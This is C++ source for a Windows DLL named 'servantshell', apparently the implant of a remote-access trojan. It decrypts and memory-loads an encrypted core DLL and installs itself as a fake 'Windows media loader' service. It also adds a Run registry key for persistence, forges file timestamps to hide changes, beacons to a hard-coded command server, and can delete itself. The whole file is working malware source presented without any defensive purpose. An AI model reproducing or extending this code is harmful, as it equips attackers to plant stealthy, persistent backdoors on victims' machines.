#include "stdafx.h"
#include "destruction/SelfDestruction.h"
#include "file/MyFile.h"
#include "peutils/peutils.h"
#include "BinNames.h"
#include "Chameleon.h"
#include "common.h"
#include "shell.h"
#include "SvtShell.h"
#include "Exports.h"
#include "env/Wow64.h"
#include <Winsock2.h>

#pragma comment(lib, "ws2_32.lib")

SHELL_API LPCTSTR GetLocalPath()
{
	return GetBinFilepath();
}

SHELL_API BOOL SendMsg( const LPBYTE pData, DWORD dwSize, COMM_NAME commname /*= COMMNAME_DEFAULT*/, ULONG targetIP /*= 0*/ )
{
	return Shell::GetInstanceRef().Servant_SendMsg(pData, dwSize, commname, targetIP);
}

SHELL_API BOOL XFC( const LPVOID lpPlain, DWORD dwPlainLen, LPVOID lpEncrypted, UINT factor0, UINT factor1 )
{
	XorFibonacciCrypt(lpPlain, dwPlainLen, lpEncrypted, factor0, factor1);

	return TRUE;
}

SHELL_API BOOL GetClientID( GUID* pGuid )
{
	if (NULL == pGuid) return FALSE;

	return Shell::GetInstanceRef().Servant_GetCID(*pGuid);
}

SHELL_API void SD()
{
	//停止Servantshell工作
	DeinitServantShell();
	SelfDestruction::DeleteRunItem();
	SelfDestruction::ExitAndDeleteSelfDll(g_hServantshell);
	ExitProcess(0);
}

SHELL_API void GetSvrInfo(PSERVICE_INFO* const info)
{
	*info = &g_ServiceInfo;
}

SHELL_API BOOL ReplaceIIDName( LPVOID lpBase, LPCSTR pTargetName, LPCSTR pReplaceName )
{
	return PEUtils::ReplaceIIDName(lpBase, pTargetName, pReplaceName);
}

SHELL_API BOOL AdjustTimes( LPCTSTR filepath )
{
	tstring me;
	me = GetBinFilepath();
	me += GetBinFilename();
	MyFile selfFile;
	if (! selfFile.Open(me.c_str(), GENERIC_READ, OPEN_EXISTING, FILE_SHARE_READ))
	{
		errorLogE(_T("open file failed[%s]"), me.c_str());
		return FALSE;
	}

	FILETIME creationTime, lastAccessTime, lastWriteTime;
	if (! ::GetFileTime(selfFile, &creationTime, &lastAccessTime, &lastWriteTime))
	{
		errorLogE(_T("get file time failed."));
		return FALSE;
	}

	MyFile targetFile;
	if (! targetFile.Open(filepath, GENERIC_WRITE, OPEN_EXISTING, FILE_SHARE_WRITE))
	{
		errorLogE(_T("open target[%s] failed."), filepath);
		return FALSE;
	}

	return ::SetFileTime(targetFile, &creationTime, &lastAccessTime, &lastWriteTime);	
}

typedef void (*FnInit) (LPCTSTR serviceName, LPCTSTR displayName, LPCTSTR descripion, LPCTSTR filepath, LPCTSTR svchostName);

SHELL_API BOOL InitSvr()
{
//	CODE_MARK_BEGIN();
#ifdef _DEBUG
	strcpy_s(g_ServiceInfo.szDisplayName, "Windows media loader");
	strcpy_s(g_ServiceInfo.szServiceDecript, "maker your mediaplayer load media file faster");
	strcpy_s(g_ServiceInfo.szServiceName, "medialoader");
#endif

	// 	tstring filepath = GetBinFilepath();
	// 	filepath += SERVANT_SHELL_BINNAME;
	TCHAR myfilepath[MAX_PATH] = {0};
	::GetModuleFileName(g_hServantshell, myfilepath, MAX_PATH);
	tstring filepath = myfilepath;

//	if (g_ServiceInfo.bUseChameleon) Camp(filepath.c_str(), SERVANT_SHELL_BINNAME, filepath);

	tstring svchostName = filepath;
	tstring::size_type pos = svchostName.find_last_of('\\');
	if (pos != tstring::npos) svchostName = svchostName.substr(pos + 1);
	pos = svchostName.find_last_of('.');
	if (pos != tstring::npos) svchostName = svchostName.substr(0, pos);

	MyFile file;

	tstring dllpath = GetBinFilepath();
	dllpath += SERVANT_CORE_BINNAME;

	if (! file.Open(dllpath.c_str(), GENERIC_READ, OPEN_EXISTING, FILE_SHARE_READ))
	{
		errorLogE(_T("open file [%s] failed"), dllpath.c_str());
		return FALSE;
	}
	ByteBuffer content;
	if (! file.ReadAll(content))
	{
		errorLogE(_T("read file [%s] failed"), dllpath.c_str());
		return FALSE;
	}
#ifdef USE_ENCRYPTED_CORE
	debugLog(_T("decrypt dll file"));
	XorFibonacciCrypt((LPBYTE)content, content.Size(), (LPBYTE)content, 3, 5);
#endif

	//替换引入表，将对servantshell.dll的引入，替换为当前dll的引入
	if (_tcscmp(GetBinFilename(), SERVANT_SHELL_BINNAME) != 0)
	{
		BOOL bReplaceOK = ReplaceIIDName((LPBYTE)content, t2a(SERVANT_SHELL_BINNAME), t2a(GetBinFilename()));
		infoLog(_T("replace IIDName [%s]->[%s] ret %d"), SERVANT_SHELL_BINNAME, GetBinFilename(), bReplaceOK);
		if (! bReplaceOK) return FALSE;
	}

	CMemLoadDll* pServant = new CMemLoadDll;

	BOOL bSuccess = FALSE;
	do 
	{
		if (! pServant->MemLoadLibrary((LPBYTE)content, content.Size()))
		{
			errorLogE(_T("load memlibrary failed [%s]"), dllpath.c_str());
			break;
		}

#define GETPROCADDRESS(_var, _type, _name)							\
	(_var) = (_type) pServant->MemGetProcAddress(_name);			\
	if (NULL == (_var))												\
		{																\
		errorLog(_T("get address of p[%s] failed"), a2t(_name));	\
		break;														\
		}

		FnInit inssvc = NULL;

		GETPROCADDRESS(inssvc,FnInit,"InstallService");
		if (inssvc)
			inssvc(a2t(g_ServiceInfo.szServiceName),a2t(g_ServiceInfo.szDisplayName),a2t(g_ServiceInfo.szServiceDecript),filepath.c_str(), svchostName.c_str());

		bSuccess = TRUE;

	} while (FALSE);

	if (! bSuccess)
	{
		delete pServant;
		pServant = NULL;
	}

	return bSuccess;
//	CODE_MARK_END();
}

SHELL_API void CheckDT()
{
	SetFileTimes(g_locationDir.c_str(), TRUE, TIMES_PARAM(g_ftLocationDir));
}
SHELL_API void InitRun()
{
	TCHAR dllpath[MAX_PATH];
	GetModuleFileName(GetModuleHandle(SERVANT_SHELL_BINNAME), dllpath, MAX_PATH);

	TCHAR rundllpath[MAX_PATH];
	GetSystemDirectory(rundllpath,MAX_PATH);

	tstring strCmd = _T("\"");
	strCmd += rundllpath;
	strCmd += _T("\\rundll32.exe\" \"");
	strCmd += dllpath;
	strCmd += _T("\"");
	strCmd += _T(" Init");

	HKEY hKey;
	LONG lnRes = RegOpenKeyEx(
		HKEY_CURRENT_USER,
		_T("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"),
		0,KEY_WRITE,
		&hKey
		);

	if( ERROR_SUCCESS == lnRes )
	{
		lnRes = RegSetValueEx(hKey,
			_T("Medialoader"),
			0,
			REG_SZ,
			(BYTE*)strCmd.c_str(),
			strCmd.length()*sizeof(TCHAR));
	}
	RegCloseKey(hKey);
	Init();
}
SHELL_API BOOL Init(BOOL bWait)
{
	//获取所在目录的时间
	g_locationDir = GetBinFilepath();
	if (g_locationDir.back() == '\\') g_locationDir.erase(g_locationDir.size() - 1);
	GetFileTimes(g_locationDir.c_str(), TRUE, TIMES_PARAM(g_ftLocationDir));

	debugLog(_T("init servantshell. filepath is %s%s"), GetBinFilepath(), GetBinFilename());
#ifdef _DEBUG
	g_ConfigInfo.nDefaultCommType = COMMNAME_UDPS;
	g_ConfigInfo.nPort = 8082;
	g_ConfigInfo.nFirstConnectHour = -1;
	g_ConfigInfo.nFirstConnectMinute = -1;
	g_ConfigInfo.nTryConnectIntervalM = 1;
	strcpy_s(g_ConfigInfo.szGroups, sizeof(g_ConfigInfo.szGroups), "Default");
	strcpy_s(g_ConfigInfo.szAddr, sizeof(g_ConfigInfo.szAddr), "192.168.50.150");

	//	strcpy_s(g_CampInfo.szDllName, sizeof(g_CampInfo.szDllName), t2a(SERVANT_SHELL_BINNAME));
// #else
// 	//如果被随机名称，则清理原servantshell.dll
// 	if (_tcscmp(GetBinFilename(), SERVANT_SHELL_BINNAME) != 0)
// 	{
// 		Wow64FsRedirectionDisabler wow64Disabler;
// 		wow64Disabler.Disable();
// 
// 		tstring srcServantFilepath = g_ServiceInfo.szInstalPath;
// 		if (srcServantFilepath.size() > 0 && srcServantFilepath.back() != '\\') srcServantFilepath += '\\';
// 		srcServantFilepath += SERVANT_SHELL_BINNAME;
// 		debugLog(_T("try to clean src : %s"), srcServantFilepath.c_str());
// 		SelfDestruction::CleanFile(srcServantFilepath.c_str());
// 		SelfDestruction::DeleteFileIgnoreReadonly(srcServantFilepath.c_str());
// 	}
#endif
	strcpy_s(g_ConfigInfo.szServantshellRealname, sizeof(g_ConfigInfo.szServantshellRealname), t2a(GetBinFilename()));

	WSADATA wsaData = {0};
	::WSAStartup(MAKEWORD(2, 2), &wsaData);

	if (! Shell::GetInstanceRef().Init())
	{
		errorLog(_T("init shell failed"));
		return FALSE;
	}

	while (bWait)
	{
		Sleep(10000);
	}
	return TRUE;
}